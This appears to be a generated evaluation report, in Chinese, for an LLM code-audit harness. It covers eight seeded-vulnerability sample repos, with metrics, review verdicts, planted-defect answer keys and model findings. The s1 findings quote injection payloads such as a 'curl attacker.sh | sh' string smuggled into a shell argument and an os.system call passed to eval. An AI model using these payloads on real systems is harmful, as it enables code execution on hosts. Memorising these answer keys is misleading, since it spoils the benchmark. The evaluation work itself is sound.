# 代码审计 Harness · 难度梯度靶场（8 个）

模型：`deepseek-flash`　·　每个样本重复 1 次　·　行号容差档位 [0, 1, 2, 3, 4, 6, 8]

这份文档是**实测产物**，不是设计说明：所有数字都由 `eval/run_bench.py` 跑出来后
从 `eval/bench-results.json` 现算，改标注或重跑模型后重新生成即可，不存在手抄误差。

生成命令：

```bash
cd backend
python -m eval.run_bench --repeats 1 --out eval/bench-results.json        # 跑靶场（调真实模型）
python -m eval.run_bench --samples s1-obvious-danger,s6-authz-logic \
       --repeats 3 --out eval/variance-results.json                     # 可复现性
python -m eval.make_review                                             # 摊平待判定条目
python -m eval.make_report                                            # 生成这份文档
```

> 重跑之前请先读第七节「已知局限」。另外 `eval/bench-results-contaminated.json`
> 保留了一版**已作废**的结果：那份靶场把缺陷标注以行尾注释的形式写在了被审代码里，
> 等于把答案印在题目下面，模型分数被显著抬高（多个样本 R=P=100%）。
> 留着它是为了让「数据污染会怎样」这件事有据可查。

---

## 一、为什么不用 OWASP Benchmark / Juliet

先说清设计依据，否则这 8 个样本像是随手编的。

| 现成基准 | 规模 | 用它做 LLM 代码审查测什么 | 为什么不合适 |
|---|---|---|---|
| OWASP Benchmark | 2,740 例 / 11 类 CWE | 单文件、单漏洞、静态可判 | 公开十余年，**几乎确定进了训练集**；无难度分档；缺竞态、越权、业务逻辑 |
| NIST Juliet | ~64,000 例 | 同上 | 同上，且判分只看「有没有报出这一类」，不看定位与说明质量 |
| GitHub ReviewBench | 219 个真实 PR / 1.04 亿 PR 中筛出 | 真实审查 | 只有真实缺陷分布，**没有难度梯度**，无法回答「难到什么程度开始失效」 |

来自公开测评的三个关键事实，直接决定了这份靶场的设计：

1. **误报比漏报更能区分审查者**（Red-Pen Bench）。一个把什么都报一遍的审查者，得分低于什么都不报的 —— 所以本文档**逐条列出多报**，不只看召回。
2. **难度分档不跨模型单调**。某个模型在 L3 强、L6 弱，另一个模型可能反过来。所以每个样本都标了「它考的是什么能力」，而不是笼统的「难/易」。
3. **单次跑分是观测值，不是稳定测量**。同一 PR 重跑三次，首轮为真的 15 个发现只复现了 7 个。所以本文档附了可复现性一节。

据此，8 个样本按**「需要什么才能发现」**分层，而不是按代码行数或漏洞知名度：

| 层 | 需要的能力 | 样本 |
|---|---|---|
| L1–L2 | 认识危险 API、认识资源与错误处理模式 | s1、s2 |
| L3–L4 | 追踪数据来源、构造并发交错 | s3、s4 |
| L5–L6 | 自己立前提/建模型，再回头验证实现 | s5、s6 |
| L7–L8 | 跨文件跟数据流、掌握密码学性质 | s7、s8 |

---

## 二、总览

两套口径都给：**自动匹配**（只有「同文件 + 行号在 ±2 行内」才算命中，完全可复现、不含任何主观判断）与**人工复核**（逐条判定，理由见第四节）。
只报对自己有利的那一套等于作弊，所以两张数字并列。

| 样本 | 难度 | 考的能力 | 文件 | 标注 | 规则召回 | 自动召回 | 自动精确率 | 自动 F1 | 复核召回 | 复核精确率 | 轮数 | 耗时 |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| [`s1-obvious-danger`](#s1-obvious-danger) | L1 基础 | 标准口径 | 2 | 5 | 60% | 80% | 100% | 89% | 100% | 100% | 5 | 27s |
| [`s2-resources-errors`](#s2-resources-errors) | L2 基础 | 标准口径 | 2 | 4 | 75% | 100% | 80% | 89% | 100% | 100% | 7 | 51s |
| [`s3-input-paths`](#s3-input-paths) | L3 进阶 | 完整背景（给出关注方向） | 1 | 4 | 0% | 100% | 100% | 100% | 100% | 100% | 8 | 56s |
| [`s4-concurrency`](#s4-concurrency) | L4 进阶 | 诊断型（先推根因） | 1 | 4 | 0% | 75% | 75% | 75% | 100% | 100% | 10 | 120s |
| [`s5-boundaries`](#s5-boundaries) | L5 高级 | 诊断型（先立前提） | 1 | 6 | 0% | 100% | 100% | 100% | 100% | 100% | 11 | 143s |
| [`s6-authz-logic`](#s6-authz-logic) | L6 高级 | 诊断型（先建模型） | 1 | 4 | 0% | 75% | 60% | 67% | 75% | 100% | 7 | 61s |
| [`s7-crossfile-flow`](#s7-crossfile-flow) | L7 专家 | 定位型（只给位置，不给缺陷描述） | 1 | 2 | 100% | 100% | 67% | 80% | 100% | 80% | 7 | 40s |
| [`s8-crypto-protocol`](#s8-crypto-protocol) | L8 专家 | 诊断型（先立安全目标） | 1 | 5 | 20% | 60% | 60% | 60% | 100% | 83% | 8 | 91s |
| **平均** | | | | **34** | **32%** | **86%** | **80%** | **82%** | **97%** | **95%** | | |

自动口径　召回 █████████· 86%　精确率 ████████·· 80%

复核口径　召回 ██████████ 97%　精确率 ██████████ 95%

> **规则召回**：`harness/rules.py` 的确定性规则（正则 + 结构判定）在同一批标注上的召回率。
> 它不受模型影响，可作为「不用 LLM 能拿到多少」的下界参照。

---

## 三、指标对「行号容差」有多敏感

这一节是本文档最该被认真看的部分。

一条缺陷横跨多条语句时（例如「读长度 → 判上限 → 写入集合」三步的竞态），
标注落在哪一行、模型指向哪一行，天然会差 3~4 行。只报一个容差档下的数字，
等于把**位置口径的差异**算成**能力的差异**。

下表是各样本 F1 随容差增长的走势（容差 = 允许预测与标注相距多少行仍算命中）：

| 样本 | ±0 | ±1 | ±2（默认） | ±3 | ±4 | ±6 | ±8 |
|---|---|---|---|---|---|---|---|
| `s1-obvious-danger` | 67% | 89% | 89% | 89% | 89% | 89% | 89% |
| `s2-resources-errors` | 44% | 89% | 89% | 100% | 100% | 100% | 100% |
| `s3-input-paths` | 100% | 100% | 100% | 100% | 100% | 100% | 100% |
| `s4-concurrency` | 50% | 50% | 75% | 100% | 100% | 100% | 100% |
| `s5-boundaries` | 100% | 100% | 100% | 100% | 100% | 100% | 100% |
| `s6-authz-logic` | 44% | 44% | 67% | 86% | 86% | 86% | 86% |
| `s7-crossfile-flow` | 29% | 67% | 80% | 80% | 100% | 100% | 100% |
| `s8-crypto-protocol` | 55% | 55% | 60% | 89% | 89% | 89% | 89% |
| **平均 F1** | **61%** | **74%** | **82%** | **93%** | **95%** | **95%** | **95%** |

读法：**接近水平的行**说明结论稳健，模型确实定位到了那一行；
**明显上台阶的行**说明有相当一部分「漏报」只是指向了同一处缺陷的另一行。
整体从 ±0 的 61% 升到 ±4 的 95%，说明这份靶场的绝对指标**高度依赖位置口径**。

> 更早一版权威基准（OWASP / Juliet）多为单文件单漏洞、缺陷落在一行内，
> 所以它们不会暴露这个敏感性。真实审查里缺陷横跨多行是常态 ——
> 这也是判断「能不能用这类基准做模型选型」的一个理由。

---

## 四、人工复核（逐条判定）

自动匹配在两头都会出错，必须逐条看。三类典型情况都在这批数据里真实出现过：

1. **同一缺陷、行号不同 → 被算成「一漏一多」。**
   `s4` 的竞态窗口是「读 `len(used)` / 判上限 / `used.add`」三步，
   模型从读起点切入、标注落在写操作，相距 3 行，于是同时产生一条「漏报」和一条「误报」。
2. **模型报了一处标注集里没有的真缺陷 → 被算成误报。**
   `s6` 的 `cancel` 完全不校验 `user_id`、`s7` 的 `export` 允许把导出路径
   完全交给请求方、`s2` 的 CSV 字段未转义 —— 都是真问题，只是我的答案键没收录。
3. **两条不同缺陷恰好相邻 → 互相顶替。**
   `s8` 里 `sign`/`verify` 的 `'.'` 切分不对称（真缺陷）离「非常量时间比较」只差 2 行，
   被自动算作后者命中；而后者自己反倒被判成了「冗余」。

### 判定标准

| 判定 | 含义 | 计入指标的方式 |
|---|---|---|
| `hit` | 自动命中的是同一缺陷 | 进命中 |
| `merged` | 一条发现合并描述了多条标注 / 多个缺陷点，内容确实覆盖 | 进命中，被覆盖的标注计为已覆盖 |
| `placement` | 同一缺陷，位置不同 | 进命中，对应标注计为已覆盖 |
| `key_gap` | 模型报的是真缺陷，标注集没收录 | 进命中（答案键的问题，不是模型的错） |
| `partial` | 可争议：确有其事，但算不算缺陷取决于设计约定或加固等级 | **计入误报**（从严） |
| `true_fp` | 明确误报 | 计入误报 |
| `true_miss` | 明确漏报 | 计入漏报 |

复核口径的两个公式：

```text
复核召回 = (标注总数 − 判定为 true_miss/partial 的漏报数) / 标注总数
复核精确率 = 判定为 hit/merged/placement/key_gap 的预测数 / 判定为该四类或 partial/true_fp 的预测数
```

> **判定者是我（助手），不是独立第三方。** 每条判定和理由都写在 `eval/review.json` 里，
> 你可以逐条推翻并重跑生成器。要注意的是：复核普遍会**上调**模型分数，
> 因为自动口径把「位置分歧」和「答案键遗漏」都算成了错误 —— 这两类在真实审查里都不是错。
> 只看复核数字会高估，只看自动数字会低估。

### 各样本判定分布与复核指标

| 样本 | 判定分布 | 复核召回 | 复核精确率 | 偏差来源 |
|---|---|---|---|---|
| `s1-obvious-danger` | `hit`×3　`merged`×2 | 100% | 100% | 自动口径下的偏差全部由位置/合并/答案键遗漏造成 |
| `s2-resources-errors` | `hit`×4　`key_gap`×1 | 100% | 100% | 自动口径下的偏差全部由位置/合并/答案键遗漏造成 |
| `s3-input-paths` | `hit`×4 | 100% | 100% | 自动口径下的偏差全部由位置/合并/答案键遗漏造成 |
| `s4-concurrency` | `hit`×3　`placement`×2 | 100% | 100% | 自动口径下的偏差全部由位置/合并/答案键遗漏造成 |
| `s5-boundaries` | `hit`×6 | 100% | 100% | 自动口径下的偏差全部由位置/合并/答案键遗漏造成 |
| `s6-authz-logic` | `hit`×3　`key_gap`×2　`true_miss`×1 | 75% | 100% | 1 条真漏报 |
| `s7-crossfile-flow` | `hit`×2　`key_gap`×2　`partial`×1 | 100% | 80% | 1 条可争议多报 |
| `s8-crypto-protocol` | `hit`×1　`key_gap`×2　`merged`×2　`partial`×1　`placement`×2 | 100% | 83% | 1 条可争议多报 |

### 逐条判定明细

<details><summary><code>s1-obvious-danger</code>　自动 R=80% P=100%</summary>

| 角色 | 位置 | 内容 | 判定 | 理由 |
|---|---|---|---|---|
| 预测 | `app/hooks.py:6` | [blocker] 插件钩子对用户代码直接 exec，无任何隔离 | `hit` | 命中 SEC013-a（exec）。 |
| 预测 | `app/settings.py:5` | [blocker] 生产凭据以明文形式硬编码在源码中 | `merged` | 这条发现明确写了「DEPLOY_KEY 与 DB_PASSWORD 两个生产环境密钥…（第 5、6 行）」，一条报告覆盖了 SEC010-a 与 SEC010-b 两条标注，属合并描述。 |
| 漏报 | `app/settings.py:6` | `SEC010-b` 数据库口令同样硬编码 | `merged` | 该标注被上面 settings.py:5 那条发现一并覆盖（原文点名了 5、6 两行）。按逐条口径算漏报，按合并口径算覆盖。 |
| 预测 | `app/settings.py:13` | [blocker] shell=True 拼接 target 造成命令注入 | `hit` | 命中 SEC011-a（shell 注入）。 |
| 预测 | `app/settings.py:19` | [blocker] 对配置表达式调用 eval，可执行任意代码 | `hit` | 命中 SEC012-a（eval）。 |

</details>

<details><summary><code>s2-resources-errors</code>　自动 R=100% P=80%</summary>

| 角色 | 位置 | 内容 | 判定 | 理由 |
|---|---|---|---|---|
| 预测 | `app/exporter.py:11` | [warn] export_csv 未用 with/try-finally，写入失败时文件句柄不被关闭 | `hit` | 命中 RES010-a（未用 with）。 |
| 预测 | `app/exporter.py:14` | [warn] CSV 字段未转义：值含逗号/引号/换行会写坏报表，含 = 开头则会触发公式注入 | `key_gap` | CSV 字段未转义且存在公式注入（值以 = + - @ 开头会被表格软件当公式执行）。rows 来自外部数据，是实打实的缺陷 —— 我的标注集只标了「未用 with」，漏收了这一处。 |
| 预测 | `app/exporter.py:23` | [note] fetch_config 用裸 except 把「键不存在」和「读取失败」混为一谈 | `hit` | 命中 ERR010-a（裸 except）。 |
| 预测 | `app/exporter.py:34` | [note] purge_cache 把清理失败上报为「删除 0 条」 | `hit` | 命中 ERR011-a（异常吞掉后返回 0）。 |
| 预测 | `app/pool.py:24` | [blocker] compute() 提前 return 时不归还连接，in_use 只增不减 | `hit` | 命中 RES011-a（提前 return 跳过 release）。 |

</details>

<details><summary><code>s3-input-paths</code>　自动 R=100% P=100%</summary>

| 角色 | 位置 | 内容 | 判定 | 理由 |
|---|---|---|---|---|
| 预测 | `app/files.py:13` | [blocker] read_upload 直接把文件名拼进路径，未做规范化与越界校验，可读任意文件 | `hit` | 命中 PATH01-a（路径穿越）。 |
| 预测 | `app/files.py:20` | [blocker] load_profile 对用户提交的字节流直接 pickle.loads，构成反序列化 RCE | `hit` | 命中 DESER01-a（pickle）。 |
| 预测 | `app/files.py:25` | [warn] load_settings 用 yaml.load 且未指定 Loader，解析外部 YAML 依赖不安全的默认加载器 | `hit` | 命中 DESER02-a（yaml.load 无 Loader）。 |
| 预测 | `app/files.py:30` | [blocker] fetch_avatar 用用户给定的 URL 直接发外部请求，无协议/主机白名单，可被用作 SSRF | `hit` | 命中 SSRF01-a（未限制目标地址）。 |

</details>

<details><summary><code>s4-concurrency</code>　自动 R=75% P=75%</summary>

| 角色 | 位置 | 内容 | 判定 | 理由 |
|---|---|---|---|---|
| 预测 | `app/cache.py:15` | [warn] ConfigCache.instance 的无锁惰性单例：两个线程可能各得到一个实例，instance() 不再全局唯一 | `hit` | 命中 CONC01-a（无锁惰性单例）。 |
| 预测 | `app/cache.py:20` | [blocker] get_or_create 的 check-then-act 无锁，两个线程会各自构建一份值，缓存被后写者覆盖且返回值不一致 | `hit` | 命中 CONC02-a（check-then-act）。 |
| 预测 | `app/cache.py:29` | [warn] allocate_slot 用 len(used) 推槽位且判断与写入非原子：并发下会分配重复槽位，且槽位满时仍可能被分配 | `placement` | 与 CONC03-a 是同一处：模型从竞态窗口的读起点（len(used)）切入，标注落在写操作（used.add）。模型把三步交错完整推演了出来，判定为同一缺陷。 |
| 漏报 | `app/cache.py:32` | `CONC03-a` 读 len 与 add 之间无锁，两个线程会拿到同一个槽位 | `placement` | CONC03-a 被上面 cache.py:29 那条发现覆盖，只是行号差 3 行超出默认容差。 |
| 预测 | `app/cache.py:38` | [warn] record_hit 的无锁「读-改-写」会丢计数，且与 snapshot 上加锁的读取口径不一致 | `hit` | 命中 CONC04-a（读-改-写丢更新）。 |

</details>

<details><summary><code>s5-boundaries</code>　自动 R=100% P=100%</summary>

| 角色 | 位置 | 内容 | 判定 | 理由 |
|---|---|---|---|---|
| 预测 | `app/limits.py:11` | [note] in_window 含两端闭区间且不校验参数次序，边界事件会被相邻窗口重复计入 | `hit` | 命中 BOUND01-a（闭区间重复计入）。 |
| 预测 | `app/limits.py:16` | [note] remaining 未声明/约束返回值下界，hits 超过 LIMIT 时返回负数 | `hit` | 命中 BOUND02-a（返回负配额）。 |
| 预测 | `app/limits.py:21` | [blocker] page_offset 与文档声明的「页码从 1 开始」不符，第 1 页会被整页跳过 | `hit` | 命中 BOUND03-a（页码基准错位）。 |
| 预测 | `app/limits.py:26` | [warn] percentage 未落实「whole 非 0」这一隐含前提，whole=0 时抛 ZeroDivisionError | `hit` | 命中 BOUND04-a（whole=0 除零）。 |
| 预测 | `app/limits.py:31` | [warn] days_between 声明「含首尾两天」但实现是半开区间，结果恒少 1 | `hit` | 命中 BOUND05-a（含尾区间少算一天）。 |
| 预测 | `app/limits.py:36` | [warn] quota_key 的时区换算被截断且未归一化，非整小时时区的配额桶边界错位 | `hit` | 命中 BOUND06-a（时区换算未归一化）。 |

</details>

<details><summary><code>s6-authz-logic</code>　自动 R=75% P=60%</summary>

| 角色 | 位置 | 内容 | 判定 | 理由 |
|---|---|---|---|---|
| 预测 | `app/orders.py:12` | [blocker] get_order 完全忽略 user_id，任何用户可读取任意订单 | `hit` | 命中 AUTHZ01-a（越权读取）。 |
| 预测 | `app/orders.py:16` | [blocker] cancel 不校验 user_id，任意用户可取消他人订单 | `key_gap` | cancel 完全不使用 user_id，任意用户可取消他人订单 —— 真缺陷，与「状态守卫只挡 shipped」是两回事，标注集只收了后者。 |
| 预测 | `app/orders.py:17` | [warn] cancel 的状态守卫只挡 shipped，重复取消与终态订单仍可迁移 | `hit` | 命中 AUTHZ02-a（状态守卫只挡 shipped）。 |
| 预测 | `app/orders.py:22` | [blocker] can_view 定义了权限模型但全仓无任何调用点，判定未接入读写路径 | `key_gap` | can_view 定义了权限判定却全仓无调用点，且是默认放行语义 —— 真缺陷，标注集未收录。 |
| 漏报 | `app/orders.py:25` | `AUTHZ03-a` 全局权限直接放行，静默覆盖了 CLIENT_DENY 里配的逐 client 拒绝 | `true_miss` | AUTHZ03-a 的具体问题是「global 权限直接放行、静默覆盖 CLIENT_DENY」。模型报了同一个函数的默认放行与未被调用，但没有点出 global 分支这条具体路径，按逐条口径判为真漏报。 |
| 预测 | `app/orders.py:30` | [blocker] refund 未校验金额范围与累计上限，可为负或超额退款 | `hit` | 命中 AUTHZ04-a（退款金额无校验）。 |

</details>

<details><summary><code>s7-crossfile-flow</code>　自动 R=100% P=67%</summary>

| 角色 | 位置 | 内容 | 判定 | 理由 |
|---|---|---|---|---|
| 预测 | `app/repository.py:8` | [warn] 连接只在 __init__ 创建，query/export 均无释放路径 | `partial` | 模型称「连接无释放路径构成泄漏」。sqlite 连接在 Repository 上常驻是常见写法，是否算泄漏取决于上层生命周期约定，本样本里没有证据表明它被反复创建。判定为**可争议多报**，从严计入误报。 |
| 预测 | `app/repository.py:12` | [blocker] query 用字符串拼接 tenant/kind，存在 SQL 注入与跨租户数据泄漏 | `hit` | 命中 FLOW001-a（SQL 注入）。 |
| 预测 | `app/repository.py:17` | [blocker] export 的 path 完全由请求方指定，构成任意文件写入 | `key_gap` | path 直接来自请求体，构成任意文件写入 —— 真缺陷，标注集未收录。该条被自动匹配算作「冗余」（因为离 FLOW002-a 只有 2 行且已被消费），属误判。 |
| 预测 | `app/repository.py:18` | [blocker] export 直接把 table 拼进 SQL，表名可被注入 | `hit` | 命中 FLOW002-a（表名注入）。 |
| 预测 | `app/repository.py:20` | [warn] export 返回值恒为 0，上层因此永远上报 rows=0 | `key_gap` | export 无条件 return 0，上层把它当行数返回，接口契约不成立 —— 真缺陷，标注集未收录。 |

</details>

<details><summary><code>s8-crypto-protocol</code>　自动 R=60% P=60%</summary>

| 角色 | 位置 | 内容 | 判定 | 理由 |
|---|---|---|---|---|
| 漏报 | `app/tokens.py:7` | `CRYPTO01-a` 签名密钥硬编码，且是低熵的固定字符串 | `merged` | CRYPTO01-a（SIGNING_SECRET 硬编码且从未被引用）的实质被 tokens.py:18 那条发现覆盖，原文点名了「文件顶部定义的 SIGNING_SECRET（L7）在全文件中从未被引用」。 |
| 预测 | `app/tokens.py:12` | [blocker] 会话 ID 用非密码学随机数 random 生成，可被预测（不可预测性失效） | `hit` | 命中 CRYPTO02-a（MT 可预测）。 |
| 预测 | `app/tokens.py:15` | [warn] 令牌不含时效与一次性标识，verify 也无法拒绝过期令牌，重放防护缺失 | `key_gap` | sign 不注入 exp/jti，verify 也不做时效判定，重放防护缺失 —— 真缺陷，标注集未收录（属设计层面的缺失，从严可争议）。 |
| 预测 | `app/tokens.py:18` | [blocker] 签名是无密钥的裸 MD5，任何人都能伪造合法令牌（不可伪造性失效） | `merged` | 这条发现同时覆盖了三件事：签名不含密钥（CRYPTO03-a）、verify 忽略 public_key （CRYPTO04-a 的实质）、以及 L7 的 SIGNING_SECRET 在全文件从未被引用（CRYPTO01-a）。一条报告覆盖三条标注。 |
| 预测 | `app/tokens.py:24` | [warn] 签名按首个 '.' 切分，payload 含 '.' 时合法令牌会被自身 verify 拒绝 | `key_gap` | sign 用 body + '.' + digest 拼接、verify 却按**第一个** '.' 切分，payload 内含 '.' 时自己签发的令牌会被自己拒绝 —— 真缺陷，标注集未收录。注意：该条被自动匹配算作命中 CRYPTO04-a，是错误计入（见 false_credit）。 |
| 预测 | `app/tokens.py:26` | [note] 摘要比对使用非常量时间的 ==，修复密钥化 MAC 后会成为侧信道 | `partial` | 非常量时间比较。模型自己在发现里写明「在当前实现下不构成可利用漏洞，是修复签名后的加固项」。属加固建议而非缺陷，从严计入误报。 |
| 预测 | `app/tokens.py:31` | [blocker] encrypt_field 用固定 32 字节密钥流做异或，无 IV 且重复使用密钥流，机密性不成立 | `placement` | 与 CRYPTO05-a 是同一处：模型指向密钥流派生行，标注落在多行表达式的收尾行。模型指的位置更准确。 |
| 漏报 | `app/tokens.py:34` | `CRYPTO05-a` 固定密钥流异或，相同明文恒定得到相同密文（确定性），且长度小于 32 字节时密钥流被复用 | `placement` | CRYPTO05-a 被上面 tokens.py:31 那条发现覆盖，只是行号差 3 行。标注落在多行表达式收尾行，模型指的起点更准确 —— 这一处是我的标注位置不理想。 |

</details>

### 被自动匹配错误计入的命中

- `s8-crypto-protocol`　预测 `app/tokens.py:24` 被算作命中了 `CRYPTO04-a @ app/tokens.py:26`。两者相距 2 行被自动判为命中，但 24 行讲的是 '.' 切分不对称，26 行讲的是非常量时间比较，不是同一件事。CRYPTO04-a 的实质由 tokens.py:18 那条覆盖。

---

## 五、逐样本详解

每节包含：审计目标原文、植入缺陷清单（答案）、规则命中情况、模型逐条结果、
以及**如何自己复现这一次运行**。

<a id="s1-obvious-danger"></a>

### L1 基础　`s1-obvious-danger`

- 考的能力：**标准口径**
- 审计根：`examples\s1-obvious-danger\repo`（标注文件 `labels.json` 在**审计根之外**，模型读不到）
- 规模：2 个文件 / 5 条标注
- 本次实测：5 轮 / 27s / 结束原因 `finished` / 缓存命中 82%
- 结果：召回 80%（4/5）　精确率 100%　F1 89%

**审计目标（提问原文）**

```text
审查这个仓库中的缺陷，重点是会导致错误行为、资源泄漏或安全问题的实现。逐文件检查，确认后记录发现。
```

**植入缺陷（答案）**

| 编号 | 位置 | 缺陷 |
|---|---|---|
| `SEC013-a` | `app/hooks.py:6` | exec 在任意输入上执行 |
| `SEC010-a` | `app/settings.py:5` | 生产凭据硬编码在源码里 |
| `SEC010-b` | `app/settings.py:6` | 数据库口令同样硬编码 |
| `SEC011-a` | `app/settings.py:14` | 外部输入拼进 shell 命令，可注入 |
| `SEC012-a` | `app/settings.py:19` | eval 执行任意表达式 |

规则基线命中 3 条，召回 60%（精确率 100%）。规则按模式匹配，**不读数据来源、不构造并发、不建权限模型** ——这正是 L3 以上样本规则全线为 0 的原因。

**模型实际报了什么（共 4 条）**

1. `app/settings.py:5` [blocker] **生产凭据以明文形式硬编码在源码中**　`复核: merged`
   - DEPLOY_KEY 与 DB_PASSWORD 两个生产环境密钥以字符串字面量直接写在模块顶层（第 5、6 行）。任何能读到该文件的人（代码仓库访问者、CI 日志、打包产物、pip 分发包）都能直接获得部署密钥与数据库口令，且轮换必须改代码并重新发布。文件在导入时即完成常量绑定，说明这不是占位/示例常量而是被直接使用的值。
2. `app/settings.py:13` [blocker] **shell=True 拼接 target 造成命令注入**　`复核: hit`
   - run_backup 把调用方传入的 target 直接字符串拼接进 shell 命令，并以 shell=True 交给 /bin/sh 解释。target 若含 shell 元字符（例如 `"/tmp; curl attacker.sh | sh #"` 或 `"$(id)"`、反引号），注入的命令会以进程权限执行；即使 target 来自「运维配置」而非终端，配置本身也可能是低信任输入。另外 target 未做空白/路径校验，带空格的目录会被拆成多个参数导致行为错误。
3. `app/settings.py:19` [blocker] **对配置表达式调用 eval，可执行任意代码**　`复核: hit`
   - expand_rule 直接 eval(expression)。该参数是运维配置里的表达式字符串，一旦表达式来源不可信（配置文件、API 参数、环境变量），即可执行任意 Python 代码（如 `__import__("os").system(...)`），等同于进程内代码执行。eval 没有传入受限 globals/locals，被测表达式可访问内建函数。
4. `app/hooks.py:6` [blocker] **插件钩子对用户代码直接 exec，无任何隔离**　`复核: hit`
   - apply_hook 把「用户提供的钩子代码」原样 exec 到传入的 namespace 中。exec 与调用进程同权限运行，钩子代码可读写文件、发起网络请求、读取环境变量中的密钥、篡改宿主状态；namespace 由调用方传入，若为宿主模块的 globals 则钩子还能覆盖宿主名字（如替换 render_hint、改写全局配置）。函数签名与文档均未声明任何沙箱、白名单或超时，也没有捕获异常，钩子抛错会直接向上冒泡打断调用方。

**漏报**

- `SEC010-b` @ `app/settings.py:6` — 数据库口令同样硬编码
  - 模型在 `app/settings.py:5` 报了一处，相距 1 行：生产凭据以明文形式硬编码在源码中 → **大概率是同一处缺陷的位置分歧**

**模型自己的收尾总结（原文摘录）**

```text
审计范围：工作区 `.` 下经 list_files（递归、上限 2000）确认仅有 2 个文件——`app/hooks.py`（14 行）与 `app/settings.py`（19 行），两者均已整文件读完；并用 grep 对 `exec(|eval(|shell=True|subprocess|DEPLOY_KEY|DB_PASSWORD` 全仓检索，未发现其他调用点或配置层缓解措施（无沙箱封装、无凭据读取辅助函数、无输入校验）。因此可以判定这两个文件即全部审计面。

共记录 4 条 blocker：
1. `app/settings.py:5-6` 生产凭据（DEPLOY_KEY、DB_PASSWORD）以明文硬编码。
2. `app/settings.py:13-14` 字符串拼接 + `shell=True` 调用 tar，target 未校验，存在命令注入（且含空格路径会被拆参导致错误行为）。
3. `app/settings.py:19` 对来自运维配置的表达式直接 `eval`，无受限 globals，可执行任意代码。
4. `app/hooks.py:6` 对用户提供的钩子代码直接 `exec(code, namespace)`，无隔离/白名单/异常处理，可在宿主进程权限下执行任意代码，并可能通过传入的 namespace 篡改宿主全局名字。

未发现但值得说明
```

**自己跑一遍**

```bash
cd backend
python -m harness -r examples\s1-obvious-danger\repo \
  -g "审查这个仓库中的缺陷，重点是会导致错误行为、资源泄漏或安全问题的实现。逐文件检查，确认后记录发现。" \
  --out reports/s1-obvious-danger.md --json reports/s1-obvious-danger.json
```

网页界面里也可以：启动 `python -m harness.server --port 8765`，打开 <http://127.0.0.1:8765/>，在左侧空间栏选中该样本，在输入坞写明要求后回车。

---

<a id="s2-resources-errors"></a>

### L2 基础　`s2-resources-errors`

- 考的能力：**标准口径**
- 审计根：`examples\s2-resources-errors\repo`（标注文件 `labels.json` 在**审计根之外**，模型读不到）
- 规模：2 个文件 / 4 条标注
- 本次实测：7 轮 / 51s / 结束原因 `finished` / 缓存命中 86%
- 结果：召回 100%（4/4）　精确率 80%　F1 89%

**审计目标（提问原文）**

```text
审查这个仓库中的缺陷，重点是会导致错误行为、资源泄漏或安全问题的实现。逐文件检查，确认后记录发现。
```

**植入缺陷（答案）**

| 编号 | 位置 | 缺陷 |
|---|---|---|
| `RES010-a` | `app/exporter.py:11` | 句柄未用 with，写入过程中抛异常则永不关闭 |
| `ERR010-a` | `app/exporter.py:23` | 裸 except 连 KeyboardInterrupt 一起吞掉 |
| `ERR011-a` | `app/exporter.py:33` | 异常被静默吞掉，调用方拿到 0 以为真的没数据 |
| `RES011-a` | `app/pool.py:25` | 提前 return 跳过下面的 release，连接被漏掉 |

规则基线命中 4 条，召回 75%（精确率 75%）。规则按模式匹配，**不读数据来源、不构造并发、不建权限模型** ——这正是 L3 以上样本规则全线为 0 的原因。

**模型实际报了什么（共 5 条）**

1. `app/pool.py:24` [blocker] **compute() 提前 return 时不归还连接，in_use 只增不减**　`复核: hit`
   - compute() 在第 22 行 acquire 后把计数加一，但第 24-25 行 `if hits > 100: return hits` 直接返回，跳过了第 26 行的 release(conn)。因此每次命中数超过 100 的调用都会永久泄漏一个连接，self.in_use 单调增长且永不复位。调用方无法弥补：泄漏的引用只在函数内部持有，函数返回后没有任何句柄能归还它，所以这是不可恢复的泄漏。任何依赖 in_use/size 做容量判断的逻辑（size 字段已声明但未被使用）会随着 hit>100 的调用累积而失效。触发条件很明确：只要有一次 key 使 count 返回值大于 100。
2. `app/exporter.py:11` [warn] **export_csv 未用 with/try-finally，写入失败时文件句柄不被关闭**　`复核: hit`
   - 第 11 行 open 之后，第 13-14 行的循环写入一旦抛异常（例如 row 不是 dict 而 raise AttributeError/TypeError，或磁盘写满、编码错误），第 15 行的 handle.close() 不会执行。CPython 虽会在对象被垃圾回收时关闭文件并给出 ResourceWarning，但关闭时机不确定，在被回收前句柄一直占用；写入不完整时也不会保证缓冲区内容落盘、更不会清理半截文件。触发条件：rows 中任意一行不是字典或 name 值不可 str 化时（如 None 之外的异常对象），以及底层 I/O 报错。
3. `app/exporter.py:14` [warn] **CSV 字段未转义：值含逗号/引号/换行会写坏报表，含 = 开头则会触发公式注入**　`复核: key_gap`
   - 字段直接用字符串拼接，没有走 csv 模块的转义规则。触发条件：name（或 id）中出现逗号时，该行会被多解析出一列，列错位；出现双引号或换行时，行的边界被破坏，整个报表的后续记录都会解析错乱。此外若值以 =、+、-、@ 开头，被 Excel/Sheets 打开时会被当作公式执行（CSV 公式注入），而 rows 通常来自外部数据，这构成安全问题。
4. `app/exporter.py:23` [note] **fetch_config 用裸 except 把「键不存在」和「读取失败」混为一谈**　`复核: hit`
   - 键不存在时 fetchone() 返回 None，取下标会抛 TypeError；数据库不可用/表结构异常时会抛 sqlite3.Error。两者都被 L23 的裸 except 吞掉，统一返回 {}，调用方无法区分「没有这条配置」和「配置读不出来」，可能在读不到凭据/开关的情况下静默走默认分支。裸 except 还会一并捕获 KeyboardInterrupt / SystemExit 等 BaseException。
5. `app/exporter.py:34` [note] **purge_cache 把清理失败上报为「删除 0 条」**　`复核: hit`
   - DELETE 或 commit 失败（锁冲突、磁盘只读、数据库损坏）时异常被吞掉，函数返回 0。返回值语义是「删除条数」，因此 0 既可表示「确实没有过期缓存」，也可表示「清理彻底失败」。若调用方按返回值记录/告警，缓存清理长期失效不会被发现，缓存表会持续膨胀。

**多报（含位置分歧的判断）**

- `app/exporter.py:14` [warn] CSV 字段未转义：值含逗号/引号/换行会写坏报表，含 = 开头则会触发公式注入
  - 最近标注：`RES010-a` @ `app/exporter.py:11`，相距 3 行 → **同一处缺陷的位置分歧**（非误报）

**模型自己的收尾总结（原文摘录）**

```text
审计范围：工作区只有 2 个文件（app/exporter.py 35 行、app/pool.py 27 行），已逐行完整读完；`git diff HEAD~1 -- app` 无差异，说明这两个文件不是本次改动引入的，因此按「逐文件检查现有实现」处理。用 grep 确认这些函数在本仓库内没有其他引用（`export_csv|fetch_config|purge_cache|Pool(|acquire|release|compute` 仅命中定义与 pool.py 内部调用），排除了「调用方已有兜底」的可能。

共记录 5 条发现：

